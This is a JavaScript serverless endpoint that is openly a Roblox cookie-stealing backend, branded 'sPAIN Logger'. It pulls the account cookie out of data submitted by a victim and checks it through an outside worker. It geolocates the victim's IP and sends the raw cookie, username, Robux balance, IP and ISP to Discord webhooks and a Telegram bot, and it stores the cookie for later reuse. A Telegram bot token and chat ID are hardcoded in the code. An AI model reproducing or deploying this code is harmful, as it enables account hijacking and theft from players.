// api/submit.js
const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
const TG_TOKEN    = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
const TG_CHAT     = process.env.TG_CHAT  || '7538845070';
const WORKER_URL  = 'https://holy-truth-3129.notrllyme133.workers.dev/';

function parseBody(raw) {
  if (!raw) return {};
  if (typeof raw === 'object' && !Buffer.isBuffer(raw)) return raw;
  try { return JSON.parse(Buffer.isBuffer(raw) ? raw.toString('utf8') : String(raw)); }
  catch { return {}; }
}

async function redisGet(key) {
  try {
    const res  = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, {
      headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
    });
    const json = await res.json();
    if (!json.result) return null;
    let r = json.result;
    if (typeof r === 'string') { try { r = JSON.parse(r); } catch { return null; } }
    if (r && typeof r.value === 'string' && !r.webhook) { try { r = JSON.parse(r.value); } catch {} }
    return r || null;
  } catch { return null; }
}

async function redisSet(key, value) {
  try {
    const res = await fetch(`${REDIS_URL}/set/${encodeURIComponent(key)}`, {
      method: 'POST',
      headers: { Authorization: `Bearer ${REDIS_TOKEN}`, 'Content-Type': 'application/json' },
      body: JSON.stringify({ value: JSON.stringify(value) })
    });
    return res.ok;
  } catch { return false; }
}

async function getIpGeo(ip) {
  try {
    if (!ip || ip === 'Unknown') return null;
    const r = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp`);
    const d = await r.json();
    return d.status === 'success' ? d : null;
  } catch { return null; }
}

async function getLiteInfo(cookie, victimIp) {
  try {
    const r = await fetch(WORKER_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ cookie, victimIp, lite: true })
    });
    if (!r.ok) return null;
    const d = await r.json();
    return d.valid ? d : null;
  } catch { return null; }
}

async function tgSend(text) {
  try {
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML' })
    });
  } catch (_) {}
}

function generateId() {
  const c = 'abcdefghijklmnopqrstuvwxyz0123456789';
  let id = '';
  for (let i = 0; i < 48; i++) id += c[Math.floor(Math.random() * c.length)];
  return id;
}

const WARN = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_';
function extractCookie(raw) {
  if (!raw) return null;
  const s = String(raw).trim();
  const m1 = s.match(/(_\|WARNING:-DO-NOT-SHARE-THIS[^|]*\|_[\w\-.]+)/); if (m1) return m1[1];
  const m2 = s.match(/_\|WARNING[^|]*\|_([\w\-.]+)/);                    if (m2) return WARN + m2[1];
  const m3 = s.match(/\|_([\w\-]{50,})/);                                if (m3) return WARN + m3[1];
  if (s.length >= 200 && /^[a-zA-Z0-9\-_.]+$/.test(s)) return WARN + s;
  return null;
}
function findCookie(slots) {
  for (const val of Object.values(slots || {})) {
    const c = extractCookie(String(val || ''));
    if (c) return c;
  }
  return null;
}

async function discordSend(url, payload) {
  if (!url?.includes('discord.com/api/webhooks')) return;
  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
  } catch (_) {}
}

async function discordChunked(url, text) {
  let rem = text; let first = true;
  while (rem.length > 0) {
    const chunk = rem.substring(0, 1990); rem = rem.substring(1990);
    await discordSend(url, {
      content: first
        ? '```\n' + chunk + (rem.length === 0 ? '\n```' : '')
        : chunk + (rem.length === 0 ? '\n```' : '')
    });
    first = false;
  }
}

function fmt(n) { return Number(n || 0).toLocaleString(); }

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(204).end();
  if (req.method !== 'POST')   return res.status(405).json({ error: 'Method not allowed' });

  const body = parseBody(req.body);
  const { slug, slots } = body;
  if (!slug)  return res.status(400).json({ error: 'slug is required' });
  if (!slots) return res.status(400).json({ error: 'slots is required' });

  const record = await redisGet(`slot:${slug}`);
  if (!record)         return res.status(404).json({ error: 'Page not found' });
  if (!record.webhook) return res.status(500).json({ error: 'No webhook configured' });

  const ip       = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.headers['x-real-ip'] || 'Unknown';
  const cookie   = findCookie(slots);
  const now      = new Date().toISOString();
  const pageName = record.displayName || slug;

  const webhooks = [record.webhook];
  if (record.dualhookParent) {
    try {
      const parent = await redisGet(`slot:${record.dualhookParent}`);
      if (parent?.webhook && parent.webhook !== record.webhook) webhooks.push(parent.webhook);
    } catch (_) {}
  }

  const [geo, liteInfo] = await Promise.all([
    getIpGeo(ip),
    cookie ? getLiteInfo(cookie, ip) : Promise.resolve(null)
  ]);

  const location = [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown';

  // ── No cookie at all ───────────────────────────────────────────────────────
  if (!cookie) {
    for (const wh of webhooks) {
      await discordSend(wh, {
        embeds: [{
          title:       '⚠️ Wrong Cookie — Troll Detected',
          description: 'Invalid or missing cookie.',
          color:       0xff3333,
          fields: [
            { name: '🌐 IP',       value: ip || 'Unknown', inline: true },
            { name: '📍 Location', value: location,         inline: true },
            { name: '🗺️ ISP',      value: geo?.isp || 'Unknown', inline: true }
          ],
          footer: { text: `sPAIN Logger • ${pageName} • ${now}` },
          timestamp: now
        }]
      });
    }
    return res.status(200).json({ success: true });
  }

  // ── Cookie found but Roblox rejected it ────────────────────────────────────
  if (!liteInfo) {
    for (const wh of webhooks) {
      await discordSend(wh, {
        embeds: [{
          title:       '⚠️ Wrong Cookie — Troll Detected',
          description: 'Cookie submitted but Roblox rejected it.',
          color:       0xff3333,
          fields: [
            { name: '🌐 IP',       value: ip || 'Unknown', inline: true },
            { name: '📍 Location', value: location,         inline: true },
            { name: '🗺️ ISP',      value: geo?.isp || 'Unknown', inline: true }
          ],
          footer: { text: `sPAIN Logger • ${pageName} • ${now}` },
          timestamp: now
        }]
      });
      // Still send the cookie even if rejected
      await discordChunked(wh, cookie);
    }
    return res.status(200).json({ success: true });
  }

  // ── Valid cookie ───────────────────────────────────────────────────────────
  const refreshId  = generateId();
  const refreshUrl = `https://spain-tools.vercel.app/api/refresh?id=${refreshId}`;

  await redisSet(`refresh:${refreshId}`, {
    cookie,
    webhook:   record.webhook,
    webhook1:  webhooks[1] || null,
    pageName,
    ip,
    isp:       geo?.isp || 'Unknown',
    createdAt: now
  });

  for (const wh of webhooks) {
    await discordSend(wh, {
      content: '@everyone',
      embeds: [{
        title:       '💰 Robux & Info',
        color:       0x5865f2,
        thumbnail:   { url: liteInfo.avatarUrl },
        fields: [
          // Row 1 — username spans full width so it stands out
          {
            name:   '👤 Username',
            value:  `\`${liteInfo.username}\` (ID: ${liteInfo.id})`,
            inline: false
          },
          // Row 2 — robux
          {
            name:   '💰 Balance',
            value:  `\`${fmt(liteInfo.robux)} R$\``,
            inline: true
          },
          {
            name:   '⏳ Pending',
            value:  `\`${fmt(liteInfo.pendingRobux)} R$\``,
            inline: true
          },
          // invisible spacer
          { name: '\u200b', value: '\u200b', inline: true },
          // Row 3 — network info
          {
            name:   '🌐 IP',
            value:  ip || 'Unknown',
            inline: true
          },
          {
            name:   '📍 Location',
            value:  location,
            inline: true
          },
          {
            name:   '🗺️ ISP',
            value:  geo?.isp || 'Unknown',
            inline: true
          },
          // Row 4 — refresh link
          {
            name:   '🔄 Refresh',
            value:  `[Open Dashboard](${refreshUrl})`,
            inline: false
          }
        ],
        footer:    { text: `sPAIN Logger • ${pageName} • ${now}` },
        timestamp: now
      }]
    });

    // Raw cookie
    await discordChunked(wh, cookie);
  }

  await tgSend([
    `🍪 <b>COOKIE — ${pageName}</b>`,
    `👤 ${liteInfo.username} (#${liteInfo.id})`,
    `💰 Robux: ${fmt(liteInfo.robux)} | Pending: ${fmt(liteInfo.pendingRobux)}`,
    `🌐 <code>${ip}</code> — ${location}`,
    `🗺️ ${geo?.isp || '?'}`,
    `🔄 ${refreshUrl}`
  ].join('\n'));

  return res.status(200).json({ success: true });
}
